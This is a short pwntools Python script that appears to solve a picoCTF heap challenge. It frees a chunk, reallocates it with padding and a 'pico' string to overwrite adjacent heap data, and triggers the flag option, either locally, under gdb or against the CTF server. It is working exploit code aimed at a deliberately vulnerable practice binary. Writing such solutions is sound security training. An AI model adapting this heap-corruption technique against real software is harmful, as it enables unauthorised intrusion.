#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("tethys.picoctf.net", 60754)
elif len(argv) >= 2 and argv[1] == "d":
    cmd = """
    	c
    """
    p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def alloc(size: int, buf):
    p.sendlineafter(b':', b'2')
    p.sendlineafter(b':', str(size).encode())
    p.sendlineafter(b':', buf)

def free():
    p.sendlineafter(b':', b'5')

free()
payload = b'A' * 8 * 3
payload += b'\00' * 6
payload += b"pico\0"
alloc(0x20, payload)
p.sendlineafter(b':', b'4')

p.interactive()
